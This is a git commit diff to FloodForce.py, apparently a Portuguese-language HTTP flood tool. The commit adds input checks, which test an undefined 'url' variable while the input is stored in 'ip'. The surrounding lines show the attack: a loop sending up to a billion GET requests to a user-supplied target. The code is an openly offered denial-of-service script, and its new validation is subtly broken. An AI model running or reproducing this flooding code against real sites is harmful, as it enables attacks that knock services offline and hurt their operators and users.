70766b77b46fd6e2c9092ab9774a459a3feda419
DarkZero <ruanvsd2024@gmail.com>
2025-08-31 23:49:25 -0300

    Update FloodForce.py

--- FloodForce.py
+++ FloodForce.py
@@ -18,6 +18,22 @@ class httpFlood:
 			try:
 				ip = input(Fore.CYAN+"Digite o ip/url (http://url.com): "+Style.RESET_ALL)
 				
+				try:
+					if not url:
+						print(Fore.YELLOW+"url em branco!!")
+						time.sleep(1)
+						exit()
+						
+					elif url  == "sair":
+						print(Fore.RED+"você saiu!")
+						time.sleep(1)
+						exit()
+							
+				except ValueError:
+					print(Fore.RED+"ERROR")
+					time.sleep(1)
+					exit()
+				
 				for i in range(1, 1000000000):
 					rqs = requests.get(ip)
 					print(Fore.GREEN+f"status do flood:", rqs.status_code, f"{i}"+Style.RESET_ALL)
